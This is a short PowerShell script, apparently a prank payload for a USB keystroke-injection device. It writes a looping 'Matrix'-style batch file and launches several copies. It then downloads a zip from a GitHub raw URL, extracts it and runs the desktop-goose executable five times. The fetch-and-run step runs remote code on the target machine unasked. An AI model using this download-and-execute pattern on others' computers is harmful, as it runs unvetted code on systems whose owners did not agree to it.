$batchContent = @"
@echo off
color 2
:top
echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
goto top
"@
#popup Matrix
mkdir C:\temp
New-Item c:\temp\matrix.bat
$batchFilePath = "c:\temp\matrix.bat"
Set-Content -Path $batchFilePath -Value $batchContent

$n=5
while($n -ne 0){
Start-Process -FilePath $batchFilePath
$n= $n-1
}
#Goose tricks
$outfile="C:\temp"
Invoke-WebRequest -Uri https://raw.githubusercontent.com/kirikatu/rubberducky/main/Goose.zip -OutFile $outfile\Goose.zip

Expand-Archive -Path $outfile\Goose.zip -DestinationPath $outfile\Goose

$n=5  
while($n -ne 0){
Start-Process -FilePath C:\temp\Goose\GooseDesktop.exe
$n= $n-1
}
